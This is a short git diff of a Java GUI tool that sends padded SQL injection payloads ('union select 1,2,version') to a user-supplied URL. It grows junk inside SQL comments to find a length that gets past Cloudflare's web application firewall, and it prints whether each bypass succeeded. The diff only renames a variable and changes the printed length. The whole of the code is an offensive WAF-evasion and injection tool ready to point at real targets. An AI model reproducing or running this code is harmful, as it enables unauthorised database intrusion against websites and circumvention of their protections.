@@ -44,12 +44,12 @@ public class Main extends JFrame implements ActionListener {
     public void actionPerformed(ActionEvent ae) {
         if (ae.getSource() == button_2) {
             for (int Tick = 1; Tick < (Integer.parseInt(jtf_2.getText()) + 1); Tick++) {
-                String ShitStrings = createRepeatedStr("HelloWorld", Tick);
-                String Data = "'id=-10' /*" + ShitStrings  + "*/ union select 1,2,version #";
+                String Strings = createRepeatedStr("HelloWorld", Tick);
+                String Data = "'id=-10' /*" + Strings  + "*/ union select 1,2,version #";
                 if(WebUtils.Post(jtf_1.getText() , Data).contains("Cloudflare")) {
-                    System.out.println("You Dont bypass PayLoad! Length:" + Data.length());
+                    System.out.println("You Dont bypass PayLoad! Length:" + Strings.length());
                 } else {
-                    System.out.println("Successed Bypassing PayLoad! Length:" + Data.length());
+                    System.out.println("Successed Bypassing PayLoad! Length:" + Strings.length());
                 }
             }
         }
